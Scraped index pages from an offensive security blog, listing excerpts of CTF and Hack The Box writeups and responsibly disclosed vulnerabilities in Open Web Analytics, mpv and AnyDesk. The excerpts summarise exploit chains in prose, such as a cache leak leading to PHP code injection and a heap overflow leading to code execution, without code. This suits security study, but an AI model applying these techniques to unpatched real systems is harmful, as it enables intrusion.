* [ctf](https://devel0pment.de/?cat=24)
* [Hack The Box](https://devel0pment.de/?cat=32)
* [Hacking-Lab.com](https://devel0pment.de/?cat=25)
* [RPISEC/MBE](https://devel0pment.de/?cat=26)
* [writeup](https://devel0pment.de/?cat=7)
## Meta

* [Log in](https://devel0pment.de/wp-login.php)
* [Entries feed](https://devel0pment.de/?feed=rss2)
* [Comments feed](https://devel0pment.de/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

[Proudly powered by WordPress](https://wordpress.org/)

We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.OkNo



=== Content from devel0pment.de_7396823b_20250119_142604.html ===

[Skip to content](#content)
![](https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png)

[devel0pment.de](https://devel0pment.de/)

software, offensive security research

# Author: scryh

Posted on [4. February 202326. June 2023](https://devel0pment.de/?p=2594)
## [Hack The Box – Response](https://devel0pment.de/?p=2594)

![](https://devel0pment.de/wp-content/uploads/2022/09/Response-e1662210806123.png)

Ever since I played [Hack The Box](https://www.hackthebox.com/), I have wanted to create a box myself. As the time went by, I encountered so much cool vulnerabilities and techniques both in real-world engagements and CTFs, which I thought would be fun to put in a box. The result of this is `Response`.

→ [Introduction](https://devel0pment.de/?p=2594#intro)

→ [User (→ bob)](https://devel0pment.de/?p=2594#user)

    – [Enumeration](https://devel0pment.de/?p=2594#enum)

    – [Server Side Request Forgery](https://devel0pment.de/?p=2594#ssrf)

    – [Internal Chat Application](https://devel0pment.de/?p=2594#chat)

    – [Cross-Protocol Request Forgery](https://devel0pment.de/?p=2594#csrf)

→ [Scanning Script (bob → scryh)](https://devel0pment.de/?p=2594#scryh)

    – [Make own HTTPS Server being scanned](https://devel0pment.de/?p=2594#https)

    – [Setting up own DNS Server](https://devel0pment.de/?p=2594#dns)

    – [Setting up own SMTP Server](https://devel0pment.de/?p=2594#smtp)

    – [Directory Traversal](https://devel0pment.de/?p=2594#dirtraversal)

→ [Incident Report (scryh → root)](https://devel0pment.de/?p=2594#root)

    – [Decrypting Meterpreter Session](https://devel0pment.de/?p=2594#meterpreter)

    – [Restoring RSA private key](https://devel0pment.de/?p=2594#rsa)

[Continue reading “Hack The Box – Response”](https://devel0pment.de/?p=2594#more-2594)

Posted on [18. March 202221. March 2022](https://devel0pment.de/?p=2494)
## [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)

[Open Web Analytics (OWA)](https://www.openwebanalytics.com/) is an open-source alternative to Google Analytics. OWA is written in PHP and can be hosted on an own server. Version 1.7.3 suffers from two vulnerabilities, which can be exploited by an unauthenticated attacker to gain RCE, when chained together.

The cause of the first vulnerability ([CVE-2022-24637](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24637)) is a single quote / double quote confusion, which leads to an information disclosure. The header of an automatically generated PHP cache file containing sensitive information is defined as '<?php\n…' instead of "<?php\n…". This leads to a literal backslash and n character being written instead of a newline character resulting in a broken PHP tag. Because of this the file is not interpreted as PHP code, but delivered in plain leaking sensitive cache information. This information can be leveraged to set a new password for the admin user.

The second vulnerability is a PHP file write, which requires admin privileges. The internal settings for the logfile path as well as the log level can be changed by manually crafting a POST request. This way the logfile can be set to a PHP file. By also increasing the log level and generating an event with attacker controlled data, PHP code can be injected into this logfile. This results in the possibility to execute arbitrary PHP code.

I would like to thank Peter Adams, the creator and maintainer of OWA who released a patch for the issue only one day after my initial notification. I was really amazed by the quick and professional reaction. There are security issues in each and every software, but the difference is how these are dealt with.

– [Introduction](https://devel0pment.de/?p=2494#intro)

– [Single / Double Quote Confusion](https://devel0pment.de/?p=2494#vuln1)

– [PHP file write](https://devel0pment.de/?p=2494#vuln2)

– [Demonstration](https://devel0pment.de/?p=2494#demo)

– [Patch and Mitigations](https://devel0pment.de/?p=2494#patch)

– [Conclusion](https://devel0pment.de/?p=2494#con)
[Continue reading “From Single / Double Quote Confusion To RCE (CVE-2022-24637)”](https://devel0pment.de/?p=2494#more-2494)

Posted on [24. October 202124. June 2023](https://devel0pment.de/?p=2431)
## [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)

![](https://devel0pment.de/wp-content/uploads/2021/10/00.png)
The [ASIS CTF Quals 2021](https://asisctf.com) ([ctftime.org](https://ctftime.org/event/1415)) took place from 22/10/2021, 15:00 UTC to 24/10/2021, 15:00 UTC providing a total amount of 24 challenges.

One of those challenges I really enjoyed was *ASCII art as a service*. This article contains my writeup for the challenge and is divided into the following sections:

– [Challenge Description](?p=2431#chlg)

– [Source Code](?p=2431#src)

– [Solution](?p=2431#sol)

[Continue reading “ASIS CTF Quals 2021 – ASCII art a a service”](https://devel0pment.de/?p=2431#more-2431)

Posted on [13. May 202113. May 2021](https://devel0pment.de/?p=2282)
## [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)

![](https://devel0pment.de/wp-content/uploads/2021/04/he21_title.png)

HackyEaster was awesome again. From a technical point of view there weren’t too much new things, but the creativity of the provided challenges made it really fun. Including the little teaser challenge there were a total amount of 37 challenges. These challenges were divided into different levels. You could only proceed to the next level, if you have earned enough points in the current level. I really liked that new idea.

[Continue reading “Hacky Easter 2021 writeup”](https://devel0pment.de/?p=2282#more-2282)

Posted on [12. April 202113. April 2021](https://devel0pment.de/?p=2217)
## [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)

![](https://devel0pment.de/wp-content/uploads/2021/04/mpv_title.png)

The [mpv](https://mpv.io/) media player provides a custom protocol handler (mf://) in order to merge multiple images to a video. An undocumented feature within this protocol handler allows the usage of a format specifier in the provided URL, which is evaluated using sprintf. This results in both, a format string vulnerability as well as a heap overflow ([CVE-2021-30145](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-30145)).

After disclosing the vulnerability to the mpv team on the 3rd April 2021 I got an immediate response. The mpv team took the issue very seriously and immediately started to work on a patch with me. This was the first time I disclosed a vulnerability to an open source project and I was really impressed about the professional reaction and the passionate commitment. The patch was released only two days after my report on the 5th April 2021 ([commit](https://github.com/mpv-player/mpv/commit/d0c530919d8cd4d7a774e38ab064e0fabdae34e6)). Thanks a lot to avih, sfan5 and jeeb.

The impact of the format string vulnerability is limited on Linux, because the binary is compiled with FORTIFY\_SOURCE by default. Though the heap overflow can be used to gain arbitrary code execution by overflowing into an adjacent heap chunk and setting a function pointer to an attacker controlled value. Nevertheless I estimate the probability of exploitation in real life as quite low, because a victim has to be tricked into opening a malicious playlist (e.g. via a URL like http://10.0.0.1/evil.m3u) and the attacker has to have detailed information about the victim’s system to fine-tune the exploit.

Within this article I describe the vulnerability itself as well as the development of a proof of concept exploit for Ubuntu 20.04.2 LTS with ASLR disabled. At the end of the article I outline a few thoughts on how ASLR can be bypassed and what changes if we develop an exploit for Windows. The article is divided into the following sections:

– [Introduction](https://devel0pment.de/?p=2217#intro)

– [Format String Vulnerability](https://devel0pment.de/?p=2217#format)

– [Heap Overflow](https://devel0pment.de/?p=2217#hoverflow)

– [Exploitation](https://devel0pment.de/?p=2217#expl)

– [Further Thoughts](https://devel0pment.de/?p=2217#ft)

– [Conclusion](https://devel0pment.de/?p=2217#con)

[Continue reading “mpv media player – mf custom protocol vulnerability (CVE-2021-30145)”](https://devel0pment.de/?p=2217#more-2217)

Posted on [1. January 202124. January 2021](https://devel0pment.de/?p=2084)
## [HACKvent20 writeup](https://devel0pment.de/?p=2084)

|  | This year’s [HACKvent](https://hacking-lab.com) hosted on [competition.hacking-lab.com](https://competition.hacking-lab.com) has been as great as every year.There was a total amount of 28 awesome challenges with varying difficulties. |
| --- | --- |

| |  | [HV20.(-1) Twelve steps of christmas](?p=2084#_1) | | --- | --- | |  | [HV20.01 Happy HACKvent 2020](?p=2084#01) | |  | [HV20.02 Chinese Animals](?p=2084#02) | |  | [HV20.03 Packed gifts](?p=2084#03) | |  | [HV20.04 Br❤celet](?p=2084#04) | |  | [HV20.05 Image DNA](?p=2084#05) | | |  | [HV20.13 Twelve steps of christmas](?p=2084#13) | | --- | --- | |  | [HV20.14 Santa’s Special GIFt](?p=2084#14) | |  | [HV20.15 Man Commands, Server Lost](?p=2084#15) | |  | [HV20.16 Naughty Rudolph](?p=2084#16) | |  | [HV20.17 Santa’s Gift Factory Control](?p=2084#17) | |  | [HV20.18 Santa’s lost home](?p=2084#18) | |  | [HV20.19 Docker Linter Service](?p=2084#19) | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| |  | [HV20.06 Twelve steps of christmas](?p=2084#06) | | --- | --- | |  | [HV20.07 Bad morals](?p=2084#07) | |  | [HV20.08 The game](?p=2084#08) | |  | [HV20.09 Santa’s Gingerbread Factory](?p=2084#09) | |  | [HV20.10 Be patient with the adjacent](?p=2084#10) | |  | [HV20.11 Chris’mas carol](?p=2084#11) | |  | [HV20.12 Wiener waltz](?p=2084#12) | | |  | [HV20.20 Twelve steps of Christmas](?p=2084#20) | | --- | --- | |  | [HV20.21 Threatened Cat](?p=2084#21) | |  | [HV20.22 Padawanlock](?p=2084#22) | |  | [HV20.23 Those who make backups are cowards!](?p=2084#23) | |  | [HV20.24 Santa’s Secure Data Storage](?p=2084#24) | |  | [HV20.H1 It’s a secret!](?p=2084#h1) | |  | [HV20.H2 Oh, another secret!](?p=2084#h2) | |  | [HV20.H3 Hidden in Plain Sight](?p=2084#h3) | |

[Continue reading “HACKvent20 writeup”](https://devel0pment.de/?p=2084#more-2084)

Posted on [6. September 20206. September 2020](https://devel0pment.de/?p=2027)
## [ALLES! CTF 2020 – Actual ASLR 1/2](https://devel0pment.de/?p=2027)

![](https://devel0pment.de/wp-content/uploads/2020/09/alles_logo.png)

The [ALLES! CTF](https://play.allesctf.net/) ([ctftime.org](https://ctftime.org/event/1091)) took place from 04/09/2020, 16:00 UTC to 06/09/2020, 19:00 UTC with a variety of interesting, creative challenges.

Within this article I want to share my writeup on the two challenges `Actual ASLR 1` and `2`, which were authored by [LiveOverflow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w). What I especially liked about the challenge(s) is that you could make progression step by step even getting a first flag on the way to a full shell, which grants access to the second flag.

The article is divided into the following sections:

→[Actual ASLR 1](#aaslr1)
    – [Binary](#binary)
    – [Random Algorithm](#ranalg)
    – [Reimplementation In Python](#reimpl)
    – [First Flag](#firstflag)

→[Actual ASLR 2](#aaslr2)
    – [Custom Heap](#heap)
    – [Vulnerability](#vuln)
    – [Heap Leak](#heapleak)
    – [Image Base Leak](#imgleak)
    – [Overwriting Function Pointer](#overwrite)
    – [Final Exploit](#final)

---

[Continue reading “ALLES! CTF 2020 – Actual ASLR 1/2”](https://devel0pment.de/?p=2027#more-2027)

Posted on [9. June 202015. June 2020](https://devel0pment.de/?p=1881)
## [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881)

![](https://devel0pment.de/wp-content/uploads/2020/06/cve.png)

One of my goals for this year is to spend a little bit more of my spare time on real world applications. Doing so I took a look at the remote desktop application [AnyDesk](https://anydesk.com/), which seems to quickly raise in popularity not only because of COVID-19. AnyDesk is available for a variety of operating systems including Windows, Linux, Android and iOS. By reversing and fuzzing the Linux version 5.5.2 of the application I was able to find a format string vulnerability, which can be used to gain Remote Code Execution (RCE) by sending a single UDP packet to the target machine. AnyDesk took the issue very seriously. They released a patch only three days after my notification (5.5.3) and paid me a bounty of 5.000 EUR. The vulnerability is tracked as [CVE-2020-13160](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-13160). Within this article I want to share all steps, which were involved in finding the vulnerability, understanding the bug and developing the RCE exploit. The article is divided into the following sections:

→ [Fuzzing](https://devel0pment.de/?p=1881#fuzzing)

→ [Bug](https://devel0pment.de/?p=1881#bug)

→ [Exploit](https://devel0pment.de/?p=1881#exploit)

    – [Strategy](https://devel0pment.de/?p=1881#strategy)

    – [The v in vsnprintf](https://devel0pment.de/?p=1881#vsnprintf)

    – [Gaining arbitrary write](https://devel0pment.de/?p=1881#write)

    – [Controlling the instruction pointer](https://devel0pment.de/?p=1881#ip)

    – [Hitting our shellcode: dynamic field width](https://devel0pment.de/?p=1881#shellcode)

    – [Final exploit](https://devel0pment.de/?p=1881#final)

→ [Conclusion](https://devel0pment.de/?p=1881#conclusion)

[Continue reading “AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)”](https://devel0pment.de/?p=1881#more-1881)

Posted on [23. May 202024. May 2020](https://devel0pment.de/?p=1593)
## [Hack The Box – Rope](https://devel0pment.de/?p=1593)

![](https://devel0pment.de/wp-content/uploads/2019/01/htb.png)

This article contains my writeup on the machine `Rope` from [Hack The Box](https://www.hackthebox.eu/). I really enjoyed the box, since it provides a total of three custom binaries, which are supposed to be exploited 🙂

![](https://devel0pment.de/wp-content/uploads/2019/10/htb_rope.png)

The article is divided into the following parts:

→ [User](https://devel0pment.de/?p=1593#user)
    – [Initial Recon](https://devel0pment.de/?p=1593#recon)
    – [httpserver](https://devel0pment.de/?p=1593#httpserver)
    – [Leak Memory Address](https://devel0pment.de/?p=1593#leak)
    – [Exploit Format String Vulnerability](https://devel0pment.de/?p=1593#fmt)
    – [Escalating from john to r4j (readlogs)](https://devel0pment.de/?p=1593#user_escalate)

→ [Root](https://devel0pment.de/?p=1593#root)
    – [Local Recon](https://devel0pment.de/?p=1593#recon2)
    – [contact](https://devel0pment.de/?p=1593#contact)
    – [Bruteforce](https://devel0pment.de/?p=1593#bruteforce)
    – [Libc Leak](https://devel0pment.de/?p=1593#libcleak)
    – [Final Exploit](https://devel0pment.de/?p=1593#finalexploit)

[Continue reading “Hack The Box – Rope”](https://devel0pment.de/?p=1593#more-1593)

Posted on [1. January 20201. January 2020](https://devel0pment.de/?p=1663)
## [HACKvent19 writeup](https://devel0pment.de/?p=1663)

|  | This year’s **HACKvent** was hosted on the brand new [Hacking-Lab 2.0](https://academy.hacking-lab.com/) plattform. Each day from the 1st of december until the 24th a new challenge is published raising in difficulty. The flag format changed from `HV18-xxxx-xxxx-xxxx-xxxx-xxxx` to `HV19{...}`. After all I managed to solve all 28 challenges 🙂 |
| --- | --- |

|  | Hidden |
| --- | --- |
| [**HV19.H1** Hidden One](https://devel0pment.de/?p=1663#chlgHV19.H1)[**HV19.H2** Hidden Two](https://devel0pment.de/?p=1663#chlgHV19.H2)[**HV19.H3** Hidden Three](https://devel0pment.de/?p=1663#chlgHV19.H3)[**HV19.H4** Hidden Four](https://devel0pment.de/?p=1663#chlgHV19.H4) | |
|  | Easy |
| [**HV19.01** censored](https://devel0pment.de/?p=1663#chlgHV19.01)[**HV19.02** Triangulation](https://devel0pment.de/?p=1663#chlgHV19.02)[**HV19.03** Hodor, Hodor, Hodor](https://devel0pment.de/?p=1663#chlgHV19.03)[**HV19.04** password policy circumvention](https://devel0pment.de/?p=1663#chlgHV19.04)[**HV19.05** Santa Parcel Tracking](https://devel0pment.de/?p=1663#chlgHV19.05)[**HV19.06** bacon and eggs](https://devel0pment.de/?p=1663#chlgHV19.06)[**HV19.07** Santa Rider](https://devel0pment.de/?p=1663#chlgHV19.07) | |
|  | Medium |
| [**HV19.08** SmileNcryptor 4.0](https://devel0pment.de/?p=1663#chlgHV19.08)[**HV19.09** Santas Quick Response 3.0](https://devel0pment.de/?p=1663#chlgHV19.09)[**HV19.10** Guess what](https://devel0pment.de/?p=1663#chlgHV19.10)[**HV19.11** Frolicsome Santa Jokes API](https://devel0pment.de/?p=1663#chlgHV19.11)[**HV19.12** back to basic](https://devel0pment.de/?p=1663#chlgHV19.12)[**HV19.13** TrieMe](https://devel0pment.de/?p=1663#chlgHV19.13)[**HV19.14** Achtung das Flag](https://devel0pment.de/?p=1663#chlgHV19.14) | |
|  | Hard |
| [**HV19.15** Santa’s Workshop](https://devel0pment.de/?p=1663#chlgHV19.15)[**HV19.16** B0rked Calculator](https://devel0pment.de/?p=1663#chlgHV19.16)[**HV19.17** Unicode Portal](https://devel0pment.de/?p=1663#chlgHV19.17)[**HV19.18** Dance with me](https://devel0pment.de/?p=1663#chlgHV19.18)[**HV19.19** U+1F385](https://devel0pment.de/?p=1663#chlgHV19.19)[**HV19.20** i want to play a game](https://devel0pment.de/?p=1663#chlgHV19.20)[**HV19.21** Happy Christmas 256](https://devel0pment.de/?p=1663#chlgHV19.21) | |
|  | Leet |
| [**HV19.22** The command … is lost](https://devel0pment.de/?p=1663#chlgHV19.22)[**HV19.23** Internet Data Archive](https://devel0pment.de/?p=1663#chlgHV19.23)[**HV19.24** ham radio](https://devel0pment.de/?p=1663#chlgHV19.24) | |

[Continue reading “HACKvent19 writeup”](https://devel0pment.de/?p=1663#more-1663)

## Posts navigation

Page 1
[Page 2](https://devel0pment.de/?paged=2&author=1)
…
[Page 4](https://devel0pment.de/?paged=4&author=1)
[Next page](https://devel0pment.de/?paged=2&author=1)

Search for:

Search

## Pages

* [About](https://devel0pment.de/?page_id=2665)
* [Contact](https://devel0pment.de/?page_id=2)

## Recent Posts

* [Hack The Box – Response](https://devel0pment.de/?p=2594)
* [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)
* [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)
* [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)
* [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)
## Recent Comments

* scryh on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4174)
* [m3dsec](https://m3dsec.github.io/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-4173)
* [TobjasR](https://www.linkedin.com/in/tobjasr/) on [AnyDesk UDP Discovery Remote Code Execution (CVE-2020-13160)](https://devel0pment.de/?p=1881#comment-3704)
* scryh on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3411)
* Tomer on [RPISEC/MBE: writeup lab07 (Heap Exploitation)](https://devel0pment.de/?p=386#comment-3408)
## Archives

* [February 2023](https://devel0pment.de/?m=202302)
* [March 2022](https://devel0pment.de/?m=202203)
* [October 2021](https://devel0pment.de/?m=202110)
* [May 2021](https://devel0pment.de/?m=202105)
* [April 2021](https://devel0pment.de/?m=202104)
* [January 2021](https://devel0pment.de/?m=202101)
* [September 2020](https://devel0pment.de/?m=202009)
* [June 2020](https://devel0pment.de/?m=202006)
* [May 2020](https://devel0pment.de/?m=202005)
* [January 2020](https://devel0pment.de/?m=202001)
* [July 2019](https://devel0pment.de/?m=201907)
* [June 2019](https://devel0pment.de/?m=201906)
* [March 2019](https://devel0pment.de/?m=201903)
* [February 2019](https://devel0pment.de/?m=201902)
* [January 2019](https://devel0pment.de/?m=201901)
* [August 2018](https://devel0pment.de/?m=201808)
* [July 2018](https://devel0pment.de/?m=201807)
* [May 2018](https://devel0pment.de/?m=201805)
* [March 2018](https://devel0pment.de/?m=201803)
* [February 2018](https://devel0pment.de/?m=201802)
* [January 2018](https://devel0pment.de/?m=201801)
## Categories

* [article](https://devel0pment.de/?cat=29)
* [ctf](https://devel0pment.de/?cat=24)
* [Hack The Box](https://devel0pment.de/?cat=32)
* [Hacking-Lab.com](https://devel0pment.de/?cat=25)
* [RPISEC/MBE](https://devel0pment.de/?cat=26)
* [writeup](https://devel0pment.de/?cat=7)
## Meta

* [Log in](https://devel0pment.de/wp-login.php)
* [Entries feed](https://devel0pment.de/?feed=rss2)
* [Comments feed](https://devel0pment.de/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

[Proudly powered by WordPress](https://wordpress.org/)

We use cookies to ensure that we give you the best experience on our website. If you continue to use this site we will assume that you are happy with it.OkNo



=== Content from devel0pment.de_57465829_20250119_142603.html ===

[Skip to content](#content)
![](https://devel0pment.de/wp-content/uploads/2018/03/cropped-dev_05.png)
# [devel0pment.de](https://devel0pment.de/)

software, offensive security research

 [Scroll down to content](#content)

## Posts

Posted on [4. February 202326. June 2023](https://devel0pment.de/?p=2594)
### [Hack The Box – Response](https://devel0pment.de/?p=2594)

![](https://devel0pment.de/wp-content/uploads/2022/09/Response-e1662210806123.png)

Ever since I played [Hack The Box](https://www.hackthebox.com/), I have wanted to create a box myself. As the time went by, I encountered so much cool vulnerabilities and techniques both in real-world engagements and CTFs, which I thought would be fun to put in a box. The result of this is `Response`.

→ [Introduction](https://devel0pment.de/?p=2594#intro)

→ [User (→ bob)](https://devel0pment.de/?p=2594#user)

    – [Enumeration](https://devel0pment.de/?p=2594#enum)

    – [Server Side Request Forgery](https://devel0pment.de/?p=2594#ssrf)

    – [Internal Chat Application](https://devel0pment.de/?p=2594#chat)

    – [Cross-Protocol Request Forgery](https://devel0pment.de/?p=2594#csrf)

→ [Scanning Script (bob → scryh)](https://devel0pment.de/?p=2594#scryh)

    – [Make own HTTPS Server being scanned](https://devel0pment.de/?p=2594#https)

    – [Setting up own DNS Server](https://devel0pment.de/?p=2594#dns)

    – [Setting up own SMTP Server](https://devel0pment.de/?p=2594#smtp)

    – [Directory Traversal](https://devel0pment.de/?p=2594#dirtraversal)

→ [Incident Report (scryh → root)](https://devel0pment.de/?p=2594#root)

    – [Decrypting Meterpreter Session](https://devel0pment.de/?p=2594#meterpreter)

    – [Restoring RSA private key](https://devel0pment.de/?p=2594#rsa)

[Continue reading “Hack The Box – Response”](https://devel0pment.de/?p=2594#more-2594)

Posted on [18. March 202221. March 2022](https://devel0pment.de/?p=2494)
### [From Single / Double Quote Confusion To RCE (CVE-2022-24637)](https://devel0pment.de/?p=2494)

[Open Web Analytics (OWA)](https://www.openwebanalytics.com/) is an open-source alternative to Google Analytics. OWA is written in PHP and can be hosted on an own server. Version 1.7.3 suffers from two vulnerabilities, which can be exploited by an unauthenticated attacker to gain RCE, when chained together.

The cause of the first vulnerability ([CVE-2022-24637](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24637)) is a single quote / double quote confusion, which leads to an information disclosure. The header of an automatically generated PHP cache file containing sensitive information is defined as '<?php\n…' instead of "<?php\n…". This leads to a literal backslash and n character being written instead of a newline character resulting in a broken PHP tag. Because of this the file is not interpreted as PHP code, but delivered in plain leaking sensitive cache information. This information can be leveraged to set a new password for the admin user.

The second vulnerability is a PHP file write, which requires admin privileges. The internal settings for the logfile path as well as the log level can be changed by manually crafting a POST request. This way the logfile can be set to a PHP file. By also increasing the log level and generating an event with attacker controlled data, PHP code can be injected into this logfile. This results in the possibility to execute arbitrary PHP code.

I would like to thank Peter Adams, the creator and maintainer of OWA who released a patch for the issue only one day after my initial notification. I was really amazed by the quick and professional reaction. There are security issues in each and every software, but the difference is how these are dealt with.

– [Introduction](https://devel0pment.de/?p=2494#intro)

– [Single / Double Quote Confusion](https://devel0pment.de/?p=2494#vuln1)

– [PHP file write](https://devel0pment.de/?p=2494#vuln2)

– [Demonstration](https://devel0pment.de/?p=2494#demo)

– [Patch and Mitigations](https://devel0pment.de/?p=2494#patch)

– [Conclusion](https://devel0pment.de/?p=2494#con)
[Continue reading “From Single / Double Quote Confusion To RCE (CVE-2022-24637)”](https://devel0pment.de/?p=2494#more-2494)

Posted on [24. October 202124. June 2023](https://devel0pment.de/?p=2431)
### [ASIS CTF Quals 2021 – ASCII art a a service](https://devel0pment.de/?p=2431)

![](https://devel0pment.de/wp-content/uploads/2021/10/00.png)
The [ASIS CTF Quals 2021](https://asisctf.com) ([ctftime.org](https://ctftime.org/event/1415)) took place from 22/10/2021, 15:00 UTC to 24/10/2021, 15:00 UTC providing a total amount of 24 challenges.

One of those challenges I really enjoyed was *ASCII art as a service*. This article contains my writeup for the challenge and is divided into the following sections:

– [Challenge Description](?p=2431#chlg)

– [Source Code](?p=2431#src)

– [Solution](?p=2431#sol)

[Continue reading “ASIS CTF Quals 2021 – ASCII art a a service”](https://devel0pment.de/?p=2431#more-2431)

Posted on [13. May 202113. May 2021](https://devel0pment.de/?p=2282)
### [Hacky Easter 2021 writeup](https://devel0pment.de/?p=2282)

![](https://devel0pment.de/wp-content/uploads/2021/04/he21_title.png)

HackyEaster was awesome again. From a technical point of view there weren’t too much new things, but the creativity of the provided challenges made it really fun. Including the little teaser challenge there were a total amount of 37 challenges. These challenges were divided into different levels. You could only proceed to the next level, if you have earned enough points in the current level. I really liked that new idea.

[Continue reading “Hacky Easter 2021 writeup”](https://devel0pment.de/?p=2282#more-2282)

Posted on [12. April 202113. April 2021](https://devel0pment.de/?p=2217)
### [mpv media player – mf custom protocol vulnerability (CVE-2021-30145)](https://devel0pment.de/?p=2217)

![](https://devel0pment.de/wp-content/uploads/2021/04/mpv_title.png)

The [mpv](https://mpv.io/) media player provides a custom protocol handler (mf://) in order to merge multiple images to a video. An undocumented feature within this protocol handler allows the usage of a format specifier in the provided URL, which is evaluated using sprintf. This results in both, a format string vulnerability as well as a heap overflow ([CVE-2021-30145](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-30145)).

After disclosing the vulnerability to the mpv team on the 3rd April 2021 I got an immediate response. The mpv team took the issue very seriously and immediately started to work on a patch with me. This was the first time I disclosed a vulnerability to an open source project and I was really impressed about the professional reaction and the passionate commitment. The patch was released only two days after my report on the 5th April 2021 ([commit](https://github.com/mpv-player/mpv/commit/d0c530919d8cd4d7a774e38ab064e0fabdae34e6)). Thanks a lot to avih, sfan5 and jeeb.

The impact of the format string vulnerability is limited on Linux, because the binary is compiled with FORTIFY\_SOURCE by default. Though the heap overflow can be used to gain arbitrary code execution by overflowing into an adjacent heap chunk and setting a function pointer to an attacker controlled value. Nevertheless I estimate the probability of exploitation in real life as quite low, because a victim has to be tricked into opening a malicious playlist (e.g. via a URL like http://10.0.0.1/evil.m3u) and the attacker has to have detailed information about the victim’s system to fine-tune the exploit.

Within this article I describe the vulnerability itself as well as the development of a proof of concept exploit for Ubuntu 20.04.2 LTS with ASLR disabled. At the end of the article I outline a few thoughts on how ASLR can be bypassed and what changes if we develop an exploit for Windows. The article is divided into the following sections:

– [Introduction](https://devel0pment.de/?p=2217#intro)

– [Format String Vulnerability](https://devel0pment.de/?p=2217#format)

– [Heap Overflow](https://devel0pment.de/?p=2217#hoverflow)

– [Exploitation](https://devel0pment.de/?p=2217#expl)

– [Further Thoughts](https://devel0pment.de/?p=2217#ft)

– [Conclusion](https://devel0pment.de/?p=2217#con)

[Continue reading “mpv media player – mf custom protocol vulnerability (CVE-2021-30145)”](https://devel0pment.de/?p=2217#more-2217)

Posted on [1. January 202124. January 2021](https://devel0pment.de/?p=2084)
### [HACKvent20 writeup](https://devel0pment.de/?p=2084)

|  | This year’s [HACKvent](https://hacking-lab.com) hosted on [competition.hacking-lab.com](https://competition.hacking-lab.com) has been as great as every year.There was a total amount of 28 awesome challenges with varying difficulties. |
| --- | --- |

| |  | [HV20.(-1) Twelve steps of christmas](?p=2084#_1) | | --- | --- | |  | [HV20.01 Happy HACKvent 2020](?p=2084#01) | |  | [HV20.02 Chinese Animals](?p=2084#02) | |  | [HV20.03 Packed gifts](?p=2084#03) | |  | [HV20.04 Br❤celet](?p=2084#04) | |  | [HV20.05 Image DNA](?p=2084#05) | | |  | [HV20.13 Twelve steps of christmas](?p=2084#13) | | --- | --- | |  | [HV20.14 Santa’s Special GIFt](?p=2084#14) | |  | [HV20.15 Man Commands, Server Lost](?p=2084#15) | |  | [HV20.16 Naughty Rudolph](?p=2084#16) | |  | [HV20.17 Santa’s Gift Factory Control](?p=2084#17) | |  | [HV20.18 Santa’s lost home](?p=2084#18) | |  | [HV20.19 Docker Linter Service](?p=2084#19) | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| |  | [HV20.06 Twelve steps of christmas](?p=2084#06) | | --- | --- | |  | [HV20.07 Bad morals](?p=2084#07) | |  | [HV20.08 The game](?p=2084#08) | |  | [HV20.09 Santa’s Gingerbread Factory](?p=2084#09) | |  | [HV20.10 Be patient with the adjacent](?p=2084#10) | |  | [HV20.11 Chris’mas carol](?p=2084#11) | |  | [HV20.12 Wiener waltz](?p=2084#12) | | |  | [HV20.20 Twelve steps of Christmas](?p=2084#20) | | --- | --- | |  | [HV20.21 Threatened Cat](?p=2084#21) | |  | [HV20.22 Padawanlock](?p=2084#22) | |  | [HV20.23 Those who make backups are cowards!](?p=2084#23) | |  | [HV20.24 Santa’s Secure Data Storage](?p=2084#24) | |  | [HV20.H1 It’s a secret!](?p=2084#h1) | |  | [HV20.H2 Oh, another secret!](?p=2084#h2) | |  | [HV20.H3 Hidden in Plain Sight](?p=2084#h3) | |

[Continue reading “HACKvent20 writeup”](https://devel0pment.de/?p=2084#more-2084)

Posted on [6. September 20206. September 2020](https://devel0pment.de/?p=2027)
### [ALLES! CTF 2020 – Actual ASLR 1/2](https://devel0pment.de/?p=2027)

![](https://devel0pment.de/wp-content/uploads/2020/09/alles_logo.png)

The [ALLES! CTF](https://play.allesctf.net/) ([ctftime.org](https://ctftime.org/event/1091)) took place from 04/09/2020, 16:00 UTC to 06/09/2020, 19:00 UTC with a variety of interesting, creative challenges.

Within this article I want to share my writeup on the two challenges `Actual ASLR 1` and `2`, which were authored by [LiveOverflow](https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w). What I especially liked about the challenge(s) is that you could make progression step by step even getting a first flag on the way to a full shell, which grants access to the second flag.

The article is divided into the following sections:

→[Actual ASLR 1](#aaslr1)
    – [Binary](#binary)
    – [Random Algorithm](#ranalg)
    – [Reimplementation In Python](#reimpl)
    – [First Flag](#firstflag)

